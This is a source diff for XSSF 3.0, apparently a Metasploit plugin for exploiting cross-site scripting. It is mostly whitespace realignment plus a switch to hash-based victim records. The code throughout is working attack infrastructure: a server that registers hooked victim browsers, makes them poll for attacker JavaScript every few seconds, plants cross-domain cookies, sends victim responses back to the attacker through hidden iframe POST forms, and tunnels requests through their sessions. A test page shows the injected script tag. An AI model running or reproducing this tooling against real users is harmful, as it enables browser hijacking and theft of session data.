@@ -16,71 +16,54 @@ include WEBrick
 module Msf
 	module Xssf
 	
-		XSSF_VERSION	= '2.3'
+		XSSF_VERSION		= '3.0'
 		
 		### CONSTANTS ###
 		SERVER_PORT		= 8888
 		SERVER_URI 		= '/'
 		
-		VICTIM_LOOP		= 'loop'			# Loads victim malicious loop code inside page (Javascript)
+		VICTIM_LOOP		= 'loop'		# Loads victim malicious loop code inside page (Javascript)
 		VICTIM_ASK		= 'ask'
-		VICTIM_ANSWER	= 'answer'
-		VICTIM_SAFARI	= 'cookie_safari'	# Safari needs a first special POST insade Iframe to set Cross-Domain Cookie
+		VICTIM_ANSWER		= 'answer'
+		VICTIM_SAFARI		= 'cookie_safari'	# Safari needs a first special POST insade Iframe to set Cross-Domain Cookie
 		VICTIM_TEST		= 'test.html'
 		VICTIM_GUI		= 'gui.html'
-		VICTIM_INTERVAL	= 10				# in sec (victim requests for new code comming from attacker each 10 seconds)
+		VICTIM_INTERVAL		= 10			# in sec (victim requests for new code comming from attacker each 10 seconds)
 		
-		PARAM_LOCATION	= 'location'		# Information relative to parameters in request (POST/GET)
-		PARAM_INTERVAL	= 'interval'
-		PARAM_RESPONSE	= 'response'
-		PARAM_HEADERS	= 'headers'
+		PARAM_LOCATION		= 'location'		# Information relative to parameters in request (POST/GET)
+		PARAM_INTERVAL		= 'interval'
+		PARAM_RESPONSE		= 'response'
+		PARAM_HEADERS		= 'headers'
 		PARAM_NAME		= 'name'
-		PARAM_RESPID	= 'responseid'		# Useful for XSSF Tunnel
-		PARAM_ID		= 'id'				# Rescue param for browser desactivating cookies
+		PARAM_RESPID		= 'responseid'		# Useful for XSSF Tunnel
+		PARAM_ID		= 'id'			# Rescue param for browser desactivating cookies
 		
-		PARAM_GUI_PAGE		= 'guipage'			# main | banner | victims | logs | attack | stats | stat | help | helpmenu | helpdetails
+		PARAM_GUI_PAGE		= 'guipage'		# main | banner | victims | logs | attack | stats | stat | help | helpmenu | helpdetails
 		PARAM_GUI_ACTION	= 'guiaction'		# view | (export [if log_page=attack])
-		PARAM_GUI_JSON		= 'guijson'			# if guipage=stat
+		PARAM_GUI_JSON		= 'guijson'		# if guipage=stat
 		PARAM_GUI_VICTIMID	= 'guivictimid'
 		PARAM_GUI_LOGID		= 'guilogid'
 		PARAM_GUI_EXTENTION	= 'guiextention'	# Extention of file to export
 		
-		XSSF_PUBLIC		= [false]			# Defines if XSSF GUI pages or Tunnel are accessible from internet (Default is only by local machine running MSF)
+		XSSF_PUBLIC		= [false]		# Defines if XSSF GUI pages or Tunnel are accessible from internet (Default is only by local machine running MSF)
 		XSSF_MODE		= ['Normal']		# Quiet / Normal / Verbose / Debug : Defines XSSF attack messages. 
-												# Quiet mode does not display anything. 
-												# Normal mode displays attacks and tunnel status messages only. 
-												# Verbose mode displays all 'Normal' mode messages plus received results from victims
-												# Debug mode displays all 'Verbose' mode messages plus XSSF exceptions error messages if exceptions are trigered (should not :-) )
+								# Quiet mode does not display anything. 
+								# Normal mode displays attacks and tunnel status messages only. 
+								# Verbose mode displays all 'Normal' mode messages plus received results from victims
+								# Debug mode displays all 'Verbose' mode messages plus XSSF exceptions error messages if exceptions are trigered (should not :-) )
 		
-		INCLUDED_FILES = Config.data_directory + '/xssf'
-		XSSF_RRC_FILES = '/resources/'
-		XSSF_GUI_FILES = '/gui/'
-		XSSF_LOG_FILES = '/logs/'
+		INCLUDED_FILES	= Config.data_directory + '/xssf'
+		XSSF_RRC_FILES 	= '/resources/'
+		XSSF_GUI_FILES 	= '/gui/'
+		XSSF_LOG_FILES 	= '/logs/'
 		
-		AUTO_ATTACKS = []					# Automated attacks for XSSF (cleared when closing XSSF)
+		AUTO_ATTACKS 	= []				# Automated attacks for XSSF (cleared when closing XSSF)
 		
-		TUNNEL = Hash.new					# Information relative to XSSF Tunnel
-		TUNNEL_LOCKED = Mutex.new			# Manages accesses to TUNNEL
-		TUNNEL_TIMEOUT= 10
+		TUNNEL 		= Hash.new			# Information relative to XSSF Tunnel
+		TUNNEL_LOCKED 	= Mutex.new			# Manages accesses to TUNNEL
+		TUNNEL_TIMEOUT	= 10
 		
-		
-		#								    TUNNEL
-		#         	---------------------------------------------------------
-		#			|  id  |     code     |   response   |      headers     |
-		#			---------------------------------------------------------
-		#			---------------------------------------------------------	
-		#			|  01  |     AJAX     |   abcdefgh   |      headers     |
-		#			---------------------------------------------------------	
-		#			|  02  |     AJAX     |   xyzhrjeu   |      headers     |
-		#			---------------------------------------------------------	
-		#			|  ..  |     ....     |   ........   |   ............   |
-		#
-		#
-		#   Tunnel = { 	'id' => [code, response, headers],
-		#				'01' => [AJAX, abcdefgh, headers]}
-		# 	When tunneled victim asks: concatenate and send all codes where (code != nil). Sets all sents to nil
 
-		
 		module XssfMaster
 			include Msf::Xssf::XssfDatabase
 			include Msf::Xssf::XssfTunnel
@@ -95,12 +78,12 @@ module Msf
 				self.serverHost = Rex::Socket.source_address('1.2.3.4')
 				
 				self.server  = WEBrick::HTTPServer.new(
-					:Port				=> port,
-					:Logger				=> WEBrick::Log.new($stdout, WEBrick::Log::FATAL),
+					:Port			=> port,
+					:Logger			=> WEBrick::Log.new($stdout, WEBrick::Log::FATAL),
 					:ServerSoftware 	=> "XSSF " + XSSF_VERSION,
 					:ServerType 		=> Thread,
 					:MaxClients     	=> 1000,
-					:DoNotReverseLookup => true
+					:DoNotReverseLookup 	=> true
 				)
 
 				self.server.mount(XSSF_RRC_FILES,  HTTPServlet::FileHandler, INCLUDED_FILES + XSSF_RRC_FILES)
@@ -117,12 +100,12 @@ module Msf
 				begin
 					self.attacker_srv  = WEBrick::HTTPServer.new(
 						:BindAddress 		=> XSSF_PUBLIC[0] ? '0.0.0.0' : '127.0.0.1',
-						:Port				=> port.to_i + 1,
-						:Logger				=> WEBrick::Log.new($stdout, WEBrick::Log::FATAL),
+						:Port			=> port.to_i + 1,
+						:Logger			=> WEBrick::Log.new($stdout, WEBrick::Log::FATAL),
 						:ServerSoftware 	=> "XSSF " + XSSF_VERSION,
 						:ServerType 		=> Thread,
 						:MaxClients     	=> 1000,
-						:DoNotReverseLookup => true
+						:DoNotReverseLookup 	=> true
 					)
 
 					self.attacker_srv.mount(XSSF_GUI_FILES,  HTTPServlet::FileHandler, INCLUDED_FILES + XSSF_GUI_FILES)
@@ -131,7 +114,7 @@ module Msf
 
 					self.attacker_srv.start
 				rescue
-					print_error("Error starting attacker' server : #{$!}.")			if (XSSF_MODE[0] =~ /^Debug$/i)
+					print_error("Error starting attacker' server : #{$!}.")		if (XSSF_MODE[0] =~ /^Debug$/i)
 					print_error("XSSF Tunnel and GUI pages won't be available.\n")	if (XSSF_MODE[0] =~ /^Debug$/i)
 				end
 				
@@ -179,9 +162,9 @@ module Msf
 					req.query["#{PARAM_ID}"] ? id = (req.query["#{PARAM_ID}"]).to_i : ((req.cookies.to_s =~ /#{PARAM_ID}=(\d+)/) ? id = $1.to_i : id = nil)
 						
 					case req.request_method.upcase
-						when 'GET';		process_get(req, res, id)			# Case of a GET request
+						when 'GET';	process_get(req, res, id)			# Case of a GET request
 						when 'POST';	process_post(req, res, id) 			# Case of a POST request
-						else;			process_unknown(req, res, id)
+						else;		process_unknown(req, res, id)
 					end
 				rescue
 					XSSF_404(res) 
@@ -207,11 +190,12 @@ module Msf
 						if (id)
 							# If auto attacks are running for this new victim, then we add first one to the victim
 							add_auto_attacks(id)
+
 							print_good("New victim registered with id: #{id.to_s}") if (XSSF_MODE[0] =~ /^Verbose$/i)
 							XSSF_RESP(res, loop_page(id, req.host) + xssf_post(id, req.host), 200, "OK", {	
-																						'Content-Type' 					=> 'application/javascript', 
-																						'P3P' 							=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"', 			# Don't know how P3P works (Compact Cookies Policy for IE / Safari), but it works !
-																						'Set-Cookie' 					=> "id=#{id}; Path=/;"})
+								'Content-Type' 		=> 'application/javascript', 
+								'P3P' 			=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"', 			# Don't know how P3P works (Compact Cookies Policy for IE / Safari), but it works !
+								'Set-Cookie' 		=> "id=#{id}; Path=/;"})
 						else
 							XSSF_404(res)
 						end
@@ -221,14 +205,14 @@ module Msf
 						if (id)	# If an id is given, check if victim is in an attack process or not
 							update_victim(id, req.query["#{PARAM_LOCATION}"], nil, ((req.cookies.size.to_i == 0) ? "NO" : "YES"))
 								
-							if (attack = get_first_attack(id))								# If an attack is waiting for current victim (attacks are done in priority, then tunnel)
+							if (attack = get_first_attack(id))	# If an attack is waiting for current victim (attacks are done in priority, then tunnel)
 								if (http_request_module(res, attack[0], req, id))
-									puts ""; 			print_good("Code '#{attack[1]}' sent to victim '#{id}'") if not (XSSF_MODE[0] =~ /^Quiet$/i)
+									puts ""; 		print_good("Code '#{attack[1]}' sent to victim '#{id}'") if not (XSSF_MODE[0] =~ /^Quiet$/i)
 									attacked_victims; 	create_log(id, "Attack '#{attack[1]}' launched at url '#{attack[0]}'", nil) 
 								end
 							else
 								if (victim = victim_tunneled)
-									if (victim.id == id)
+									if (victim[XSSF_VICTIM_HASH["ID"]] == id)
 										code = ""
 										
 										TUNNEL_LOCKED.synchronize {
@@ -240,9 +224,10 @@ module Msf
 											end
 										}
 										
-										(code == "") ? XSSF_404(res) : XSSF_RESP(res, code, 200, "OK", {'Content-Type' 					=> 'application/javascript', 
-																										'P3P' 							=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"', 
-																										'Set-Cookie' 					=> "id=#{id}; Path=/;"})
+										(code == "") ? XSSF_404(res) : XSSF_RESP(res, code, 200, "OK", {
+										        'Content-Type' 		=> 'application/javascript', 
+											'P3P' 			=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"', 
+											'Set-Cookie' 		=> "id=#{id}; Path=/;"})
 									else
 										XSSF_404(res)
 									end
@@ -271,23 +256,23 @@ module Msf
 				response = "";	tunnel_headers = "";	mod_name = "Unknown";	tunnelid = nil;
 
 				if req.query["#{PARAM_ID}"]
-					response 		= req.query["#{PARAM_RESPONSE}"] 	if req.query["#{PARAM_RESPONSE}"] 
+					response 	= req.query["#{PARAM_RESPONSE}"] 	if req.query["#{PARAM_RESPONSE}"] 
 					tunnel_headers	= req.query["#{PARAM_HEADERS}"] 	if req.query["#{PARAM_HEADERS}"]
-					mod_name		= req.query["#{PARAM_NAME}"] 		if req.query["#{PARAM_NAME}"]
-					tunnelid		= req.query["#{PARAM_RESPID}"] 		if req.query["#{PARAM_RESPID}"]
+					mod_name	= req.query["#{PARAM_NAME}"] 		if req.query["#{PARAM_NAME}"]
+					tunnelid	= req.query["#{PARAM_RESPID}"] 	if req.query["#{PARAM_RESPID}"]
 				else		# Sometimes Cross-Requests aren't well understood by the Webrick server parser cause Content-Type isn't properly set by browser
 					(req.body.split('&')).each do |p|
-						response 		= $1 			if (p =~ /^#{PARAM_RESPONSE}=(.*)$/)
-						tunnel_headers	= $1 			if (p =~ /^#{PARAM_HEADERS}=(.+)$/)
-						mod_name		= $1 			if (p =~ /^#{PARAM_NAME}=(.+)$/)
-						id				= Integer($1) 	if (p =~ /^#{PARAM_ID}=(.+)$/)
-						tunnelid		= $1 			if (p =~ /^#{PARAM_RESPID}=(.+)$/)
+						response 		= $1 		if (p =~ /^#{PARAM_RESPONSE}=(.*)$/)
+						tunnel_headers		= $1 		if (p =~ /^#{PARAM_HEADERS}=(.+)$/)
+						mod_name		= $1 		if (p =~ /^#{PARAM_NAME}=(.+)$/)
+						id			= Integer($1) 	if (p =~ /^#{PARAM_ID}=(.+)$/)
+						tunnelid		= $1 		if (p =~ /^#{PARAM_RESPID}=(.+)$/)
 					end
 				end
 				
 				case req.path
 					when /^#{self.serverURI + VICTIM_ANSWER}/
-						(is_tunneled = (is_tunneled.id == id)) if (is_tunneled = victim_tunneled)
+						(is_tunneled = (is_tunneled[XSSF_VICTIM_HASH["ID"]] == id)) if (is_tunneled = victim_tunneled)
 						
 						if (is_tunneled)					# POST IN TUNNEL MODE
 							tunnelid = URI.unescape(tunnelid)
@@ -314,9 +299,10 @@ module Msf
 						end
 						
 					when /^#{self.serverURI + VICTIM_SAFARI}/
-						XSSF_RESP(res, "", 200, "OK", {	'Content-Type' 	=> 'text/html', 
-														'P3P' 			=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"',
-														'Set-Cookie' 	=> "id=#{id}; Path=/;"})
+						XSSF_RESP(res, "", 200, "OK", {	
+							'Content-Type' 	=> 'text/html', 
+							'P3P' 		=> 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"',
+							'Set-Cookie' 	=> "id=#{id}; Path=/;"})
 					
 					else # Other page is asked by a victim: redirect to known file or active module (This part needs cookie to be activated) 
 						process_unknown(req, res, id)
@@ -349,18 +335,18 @@ module Msf
 			# Sends XSSF HTML response
 			#
 			def XSSF_RESP(res, body = "", code = 200, message = "OK", headers = {})
-				res['Content-Type'] 				= "text/html"			# Default, can be errased with headers
+				res['Content-Type'] 			= "text/html"			# Default, can be errased with headers
 				res['Access-Control-Allow-Origin']	= '*'
-				res['Cache-Control'] 				= 'post-check=0, pre-check=0, must-revalidate, no-store, no-cache'
-				res['Pragma'] 						= 'no-cache'  
-				res['Last-Modified'] 				= Time.now + 1000000000
-				res['Expires'] 						= Time.now - 1000000000
+				res['Cache-Control'] 			= 'post-check=0, pre-check=0, must-revalidate, no-store, no-cache'
+				res['Pragma'] 				= 'no-cache'  
+				res['Last-Modified'] 			= Time.now + 1000000000
+				res['Expires'] 				= Time.now - 1000000000
 				
-				res.body = body;		res.status = code;		res.reason_phrase = message
+				res.body = body;	res.status = code;	res.reason_phrase = message
 				headers.each_pair { |k,v| res[k] = v }
 				
-				res['Content-Length'] 		= body.size
-				res['Connection'] 			= 'close'
+				res['Content-Length'] 	= body.size
+				res['Connection'] 	= 'close'
 			end
 
 			#
@@ -372,8 +358,8 @@ module Msf
 				data = run_http_client(url, req, false)
 
 				if (data != nil)
-					data.headers['P3P'] 							= 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"'
-					data.headers['Set-Cookie'] 						= "id=#{id}; Path=/;"
+					data.headers['P3P'] 		= 'CP="HONK IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"'
+					data.headers['Set-Cookie'] 	= "id=#{id}; Path=/;"
 								
 					case (data.code).to_s
 						when /1..|4..|5../
@@ -445,13 +431,13 @@ module Msf
 					(req.unparsed_uri =~ /^#{parsed_url.path}/) ? uri = req.unparsed_uri : uri = parsed_url.path + req.unparsed_uri
 					
 					resp = client.send_recv(client.request_raw(
-												'method'=> req.request_method, 
-												'vhost'	=> parsed_url.host + ':' + parsed_url.port.to_s,
-												'agent' => req.header['user-agent'][0],
-												'cookie'=> req.cookies[0],
-												'uri'	=> process_params ? Rex::Text.to_hex_ascii(uri).gsub(/\\x/, '%') : parsed_url.path,
-												'data'  => process_params ? req.body : ""
-											))
+						'method'=> req.request_method, 
+						'vhost'	=> parsed_url.host + ':' + parsed_url.port.to_s,
+						'agent' => req.header['user-agent'][0],
+						'cookie'=> req.cookies[0],
+						'uri'	=> process_params ? Rex::Text.to_hex_ascii(uri).gsub(/\\x/, '%') : parsed_url.path,
+						'data'  => process_params ? req.body : ""
+					))
 					client.close
 					return resp
 				rescue
@@ -465,16 +451,16 @@ module Msf
 			#
 			def test_page(host)
 				return %Q{ 	<html><body>
-								<h2> TEST PAGE WITH XSS </h2><br/>
-								<pre> INJECTED : &lt;script type=&quot;text/javascript&quot; src=&quot;http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&quot;&gt;&lt;/script&gt;</pre>
-								<script type="text/javascript">
-									s = document.createElement('script');
-									s.src = "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&time=" + escape(new Date().getTime());
-									document.body.appendChild(s);
-								</script>
+							<h2> TEST PAGE WITH XSS </h2><br/>
+							<pre> INJECTED : &lt;script type=&quot;text/javascript&quot; src=&quot;http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&quot;&gt;&lt;/script&gt;</pre>
+							<script type="text/javascript">
+								s = document.createElement('script');
+								s.src = "http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_LOOP}?#{PARAM_INTERVAL}=5&time=" + escape(new Date().getTime());
+								document.body.appendChild(s);
+							</script>
 
-								<a href="http://www.google.fr">Go GoOgLe</a>
-							</body></html>
+							<a href="http://www.google.fr">Go GoOgLe</a>
+						</body></html>
 				}
 			end
 
@@ -491,7 +477,7 @@ module Msf
 					}
 	
 					if (typeof(XSSF_LOOP) != "undefined")	clearInterval(XSSF_LOOP);
-					XSSF_LOOP = setInterval(XSSF_EXECUTE_LOOP, #{(victim = get_victim(id)) ? victim.interval : VICTIM_INTERVAL} * 1000);	// Interrupt with clearInterval(XSSF_LOOP);
+					XSSF_LOOP = setInterval(XSSF_EXECUTE_LOOP, #{(victim = get_victim(id)) ? victim[XSSF_VICTIM_HASH["INTERVAL"]] : VICTIM_INTERVAL} * 1000);	// Interrupt with clearInterval(XSSF_LOOP);
 				}
 
 				return loop
@@ -632,20 +618,20 @@ module Msf
 				else
 					code << %Q{
 						function XSSF_POST(response, mod_name, headers, resp_id) {
-							headers = headers || "";		mod_name = mod_name || "Unknown";		resp_id	= resp_id || Math.floor(Math.random()*10000000);
+							headers = headers || "";		mod_name = mod_name || "Unknown";	resp_id	= resp_id || Math.floor(Math.random()*10000000);
 							
 							i = XSSF_CREATE_IFRAME(resp_id, 0, 0);	i.name = "POST_IFRAME";		document.body.appendChild(i);
 
-							clearInterval(XSSF_DO_GARBAGE);		XSSF_DO_GARBAGE = setInterval(XSSF_GARBAGE, #{TUNNEL_TIMEOUT} * 1000);
+							clearInterval(XSSF_DO_GARBAGE);	XSSF_DO_GARBAGE = setInterval(XSSF_GARBAGE, #{TUNNEL_TIMEOUT} * 1000);
 							
 							var d = null;
 							if(i.contentDocument)		d = i.contentDocument;
 							else if(i.contentWindow)   	d = i.contentWindow.document;
-							else if(i.document)			d = i.document;
-							else						return;
+							else if(i.document)		d = i.document;
+							else				return;
 
 							string  = "<form name='XSSF_FORM' id='XSSF_FORM' method='POST' enctype='multipart/form-data' action='http://#{host}:#{self.serverPort}#{self.serverURI}#{VICTIM_ANSWER}' >";
-							string += "<input name='#{PARAM_NAME}' 		value='"+escape(mod_name)+"'	type='hidden'>";
+							string += "<input name='#{PARAM_NAME}' 	value='"+escape(mod_name)+"'	type='hidden'>";
 							string += "<input name='#{PARAM_RESPONSE}' 	value='"+escape(response)+"'	type='hidden'>"; 
 							string += "<input name='#{PARAM_HEADERS}' 	value='"+escape(headers)+"' 	type='hidden'>";
 							string += "<input name='#{PARAM_RESPID}' 	value='"+escape(resp_id)+"' 	type='hidden'>"; 
